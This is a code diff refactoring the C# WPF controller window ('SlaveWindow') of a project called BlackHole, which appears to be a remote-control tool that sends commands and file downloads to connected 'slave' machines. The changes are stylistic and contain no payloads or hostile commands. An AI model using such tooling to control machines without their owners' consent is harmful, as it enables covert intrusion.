@@ -6,6 +6,7 @@ using System.Windows.Controls;
 using System.Windows.Media;
 using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
+using BlackHole.Master.Extentions;
 using BlackHole.Master.Model;
 using BlackHole.Master.Remote;
 
@@ -16,27 +17,17 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        public int Id
-        {
-            get;
-        }
+        public int Id { get; }
 
         /// <summary>
         /// 
         /// </summary>
-        public Slave Slave
-        {
-            get;
-        }
+        public Slave Slave { get; }
 
         /// <summary>
         /// 
         /// </summary>
-        public ViewModelCollection<IRemoteCommand> ViewModelCommands
-        {
-            get;
-            private set;
-        }
+        public ViewModelCollection<IRemoteCommand> ViewModelCommands { get; }
 
         /// <summary>
         /// 
@@ -72,7 +63,7 @@ namespace BlackHole.Master
         /// 
         /// </summary>
         /// <param name="slave"></param>
-        public SlaveWindow(Slave slave)
+        protected SlaveWindow(Slave slave)
         {
             Id = GetHashCode();
             Slave = slave;
@@ -83,12 +74,11 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        public SlaveWindow() { }
+        protected SlaveWindow() { }
 
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="window"></param>
         /// <param name="message"></param>
         public void Send(NetMessage message)
         {
@@ -102,13 +92,13 @@ namespace BlackHole.Master
         public override void OnApplyTemplate()
         {
             base.OnApplyTemplate();
-            FindControl<ContentPresenter>("TargetStatusPresenter", (parent) =>
+            FindControl<ContentPresenter>("TargetStatusPresenter", parent =>
             {
                 SetContentChildContext(parent, "TargetStatusBar", Slave);
-                ExecuteForContentChild<Label>(parent, "TargetStatus", (lbl) => TargetStatus = lbl);
-                ExecuteForContentChild<ToolTip>(parent, "TargetStatusTooltip", (tooltip) => TargetStatusTooltip = tooltip);
-                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipTitle", (txtBlock) => TargetStatusTooltipTitle = txtBlock);
-                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipMessage", (txtBlock) => TargetStatusTooltipMessage = txtBlock);
+                ExecuteForContentChild<Label>(parent, "TargetStatus", lbl => TargetStatus = lbl);
+                ExecuteForContentChild<ToolTip>(parent, "TargetStatusTooltip", tooltip => TargetStatusTooltip = tooltip);
+                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipTitle", txtBlock => TargetStatusTooltipTitle = txtBlock);
+                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipMessage", txtBlock => TargetStatusTooltipMessage = txtBlock);
             });
         }
 
@@ -117,6 +107,7 @@ namespace BlackHole.Master
         /// </summary>
         /// <typeparam name="T"></typeparam>
         /// <param name="controlName"></param>
+        /// <param name="callback"></param>
         /// <returns></returns>
         protected void FindControl<T>(string controlName, Action<T> callback) where T : FrameworkElement
         {
@@ -125,19 +116,19 @@ namespace BlackHole.Master
                 callback(control);
         }
 
-
         /// <summary>
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
-        protected void SetContentChildContext(ContentPresenter parent, string objectName, object context)
-            => ExecuteForContentChild<FrameworkElement>(parent, objectName, (content) => content.DataContext = context);
+        protected void SetContentChildContext(ContentPresenter parent, string objectName, object context) =>
+            ExecuteForContentChild<FrameworkElement>(parent, objectName, content => content.DataContext = context);
 
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="parent"></param>
         /// <param name="objectName"></param>
-        /// <param name="context"></param>
+        /// <param name="callback"></param>
         protected void ExecuteForContentChild<T>(ContentPresenter parent, string objectName, Action<T> callback)
             where T : FrameworkElement
         {
@@ -172,7 +163,6 @@ namespace BlackHole.Master
                 }
 
                 childElement = FindElementByName<T>(child, childName);
-
                 if (childElement != null)
                     break;
             }
@@ -183,7 +173,7 @@ namespace BlackHole.Master
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
-        /// <param name="objects"></param>
+        /// <param name="listView"></param>
         /// <param name="action"></param>
         protected void ExecuteOnSelectedItems<T>(ListView listView, Action<T> action)
         {
@@ -212,10 +202,7 @@ namespace BlackHole.Master
         {
             var temp = m_currentCommand;
             // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
-            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
-            {
-                ViewModelCommands.RemoveItem(temp);
-            });
+            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelCommands.RemoveItem(temp));
             m_currentCommand = null;
             ExecuteNextCommandIfPossible();
         }
@@ -255,9 +242,7 @@ namespace BlackHole.Master
         /// </summary>
         /// <typeparam name="TIn"></typeparam>
         /// <param name="input"></param>
-        /// <param name="onContinue"></param>
-        /// <param name="onCompleted"></param>
-        /// <param name="onCancelled"></param>
+        /// <param name="onUpdate"></param>
         protected void UpdateCommand<TIn>(TIn input, Action<RemoteCommand<TIn>> onUpdate)
         {
             var command = GetCommmandAs<TIn>();
@@ -318,7 +303,7 @@ namespace BlackHole.Master
         /// <param name="success"></param>
         /// <param name="message"></param>
         protected void FireFakeStatus(long operationId, string operation, bool success, string message) =>
-            FireSlaveEvent(SlaveEventType.INCOMMING_MESSAGE, new StatusUpdateMessage()
+            FireSlaveEvent(SlaveEventType.IncommingMessage, new StatusUpdateMessage
             {
                 WindowId = Id,
                 OperationId = operationId,
@@ -346,9 +331,9 @@ namespace BlackHole.Master
             {
                 switch ((SlaveEventType)ev.EventType)
                 {
-                    case SlaveEventType.INCOMMING_MESSAGE:
-                        ev.Data
-                            .Match()
+                    case SlaveEventType.IncommingMessage:
+                    {
+                        ev.Data.Match()
                             .With<StatusUpdateMessage>(m =>
                             {
                                 TargetStatus.Content = m.Operation;
@@ -363,9 +348,10 @@ namespace BlackHole.Master
                                     m_currentCommand.ProgressColor = Brushes.DarkRed;
                                     m_currentCommand.UpdateProgression(0, 0);
                                     m_currentCommand.DoFault();
-                                }    
+                                }
                             });
                         break;
+                    }
                 }
             });
         }
